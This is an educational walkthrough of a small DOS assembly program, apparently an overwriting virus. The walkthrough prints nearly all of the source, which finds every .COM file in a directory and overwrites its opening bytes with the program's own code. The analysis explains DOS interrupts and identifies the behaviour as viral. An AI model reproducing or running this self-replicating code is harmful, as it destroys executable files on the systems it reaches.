## Analyze

1.  **Setup and Initial Search**:
    
    -   `.model small`: This directive tells the assembler to use the small memory model, which is common in DOS where the code and data segments are expected to fit within a single 64KB segment.
    -   `FNAME EQU 9EH`: This sets the label `FNAME` to the hexadecimal value `9EH`, which is used as an offset for where the file name is stored in memory after a file search.
    -   `ORG 100H`: This sets the code's origin to address `0100H`, a common practice for DOS .COM programs, as the first 256 bytes are reserved for the Program Segment Prefix (PSP).
2.  **File Search and Opening**:
    
    -   The program begins by searching for `.COM` files using DOS interrupt `21H` with function `4EH` (find first file).
    -   The file name pattern `*.COM` is used for the search.
    -   If a file is found, the program then opens it using function `3D01H` (open file for writing).
3.  **Modifying the File**:
    
    -   The program appears to write 42 bytes (`CL = 42`) of data from its own code (`DS:0100H`) into the beginning of the found file. This is typically characteristic of a computer virus that replicates by attaching itself to other executable files.
    -   After writing, it closes the file using function `3EH` (close file handle).
4.  **Continuing the Search**:
    
    -   The program then searches for the next `.COM` file using function `4FH`.
    -   If another file is found, the loop continues; otherwise, the program exits.
5.  **Termination**:
    
    -   The program ends with a `ret` instruction, returning control to DOS.

## Details


### 1. Initial Setup

`.model small` 

-   This tells the assembler to use a small memory model, suitable for DOS programs where both code and data segments are combined and should not exceed 64KB.

`FNAME   EQU     9EH             ;search-function file name result` 

-   `FNAME` is defined as a constant with the value `9EH`. This is used as an offset in the Program Segment Prefix (PSP) where DOS stores the filename of the last file found.

`ORG     100H` 

-   Sets the origin of the code to memory address `0100H`. DOS .COM programs start at this offset, following the 256-byte PSP.

### 2. File Search and Opening

```assembly
START:
        mov     ah,4EH          ;search for *.COM (search first)
        mov     dx,OFFSET COM_FILE
        int     21H
```

-   Sets up a call to DOS interrupt `21H` with function `4EH` (find first file matching a pattern). The pattern `*.COM` is provided by the address in `DX`.

```assembly
SEARCH_LP:
        jc      DONE            ;jump to DONE if no file is found
        mov     ax,3D01H        ;open file for writing
        mov     dx,FNAME
        int     21H
```
-   If a file is found, this part tries to open it for writing. `3D01H` in `AX` is the DOS function to open a file. The filename is pointed to by `DX`.

### 3. Writing to the File

```assembly
 xchg    ax,bx           ;swap file handle to BX
        mov     ah,40H          ;prepare to write to the file
        mov     cl,42           ;size of data to write
        mov     dx,100H         ;data location (start of the program)
        int     21H
```
-   After opening the file, it writes 42 bytes from the beginning of the program (`DS:0100H`) to the file. This is typical of a virus that replicates by inserting its code into other executables.

### 4. Closing the File and Searching for the Next File

```assembly
mov     ah,3EH          ;close file
        int     21H

        mov     ah,4FH          ;search for next .COM file
        int     21H
        jmp     SEARCH_LP
```
-   Closes the current file and searches for the next `.COM` file. If another file is found, the process repeats.

### 5. Termination
```assembly
DONE:
        ret                     ;exit to DOS
```
-   Once no more files are found, the program exits and returns control to DOS.

### 6. COM File Pattern
```assembly
COM_FILE DB      '*.COM',0      ;string for COM file search
```
-   This is the data definition for the file search pattern, `*.COM`, used by the program.
